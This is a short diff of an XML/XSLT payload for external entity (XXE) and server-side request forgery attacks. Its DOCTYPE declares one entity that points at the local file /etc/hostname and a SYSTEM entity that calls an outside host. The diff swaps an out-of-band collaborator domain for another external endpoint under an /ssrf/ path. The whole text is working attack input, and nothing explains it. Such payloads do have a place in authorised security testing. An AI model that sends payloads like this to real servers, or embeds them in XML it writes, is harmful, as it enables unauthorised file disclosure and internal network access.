@@ -2,7 +2,7 @@
 <?xml-stylesheet type="text/xsl" href="?#"?>
 <!DOCTYPE div [
   <!ENTITY passwd_p        "file:///etc/hostname">
-  <!ENTITY passwd_c SYSTEM "http://4chasjtw0lg7uqk8x8xq2plu8lec2gq5.oastify.com">
+  <!ENTITY passwd_c SYSTEM "https://r1p.xyz/ssrf/1/">
 ]>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/">
